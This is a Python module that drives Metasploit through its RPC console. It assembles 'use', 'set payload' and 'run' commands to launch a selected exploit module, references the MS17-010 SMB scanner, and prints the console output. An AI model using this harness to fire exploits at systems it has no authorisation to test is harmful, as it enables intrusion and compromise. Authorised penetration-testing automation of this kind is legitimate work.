import time

import fontawesome as fa

from common.deps.pymetasploit3 import msfrpc
from common.deps.pymetasploit3.msfrpc import MsfError, PayloadModule


def run_module_with_output(console, mod, payload=None, run_as_job=False, timeout=301):
    """
    Execute a module and wait for the returned data
    Mandatory Arguments:
    - mod : the MsfModule object
    Optional Keyword Arguments:
    - payload : the MsfModule object to be used as payload
    """
    options_str = 'use {}/{}\n'.format(mod.moduletype, mod.modulename)
    if console.is_busy():
        raise msfrpc.MsfError('Console {} is busy'.format(console.cid))
    console.read()  # clear data buffer
    opts = mod.runoptions.copy()
    if payload is None:
        opts['DisablePayloadHandler'] = True

    # Set module params
    for k in opts.keys():
        options_str += 'set {} {}\n'.format(k, opts[k])

    # Set payload params
    if mod.moduletype == 'exploit':
        opts['TARGET'] = mod.target
        options_str += 'set TARGET {}\n'.format(mod.target)

        if 'DisablePayloadHandler' in opts and opts['DisablePayloadHandler']:
            pass
        elif isinstance(payload, msfrpc.PayloadModule):
            if payload.modulename not in mod.payloads:
                raise ValueError(
                    'Invalid payload ({}) for given target ({}).'.format(payload.modulename, mod.target))
            options_str += 'set payload {}\n'.format(payload.modulename)
            for k, v in payload.runoptions.items():
                if v is None or (isinstance(v, str) and not v):
                    continue
                options_str += 'set {} {}\n'.format(k, v)
        else:
            raise ValueError('No valid PayloadModule provided for exploit execution.')

    # Run the module without directly opening a command line
    options_str += 'run -z'
    if run_as_job:
        options_str += " -j"
    console.write(options_str)
    data = ''
    timer = 0
    while data == '' or console.is_busy():
        time.sleep(1)
        data += console.read()['data']
        timer += 1
        if timer > timeout:
            break
    return data


def Exploit(app, selection, host):
    cid = app.rpc["Client"].consoles.console().cid
    console = app.rpc["Client"].consoles.console(cid)

    print(fa.icons["arrow-right"] + " " + selection['name'], selection['fullname'], selection['rank'],
          selection['disclosuredate'])

    fullname = selection['fullname'].split("/")
    kind = fullname[0]
    expl = "/".join(fullname[1:])
    exploit = app.rpc["Client"].modules.use(kind, expl)
    print(exploit.check("auxiliary/scanner/smb/smb_ms17_010"))

    print(fa.icons["spinner"] + " Running " + kind + expl)



    execute(console, exploit)

    return app


def execute(console, exploit):
    out = run_module_with_output(console, exploit)
    print(out)
    print(console.read())
    time.sleep(4)
    data = console.read()['data']
    while data != '' or console.is_busy():
        print(data)
        time.sleep(1)
        data = console.read()['data']
    console.write('back')
    return False
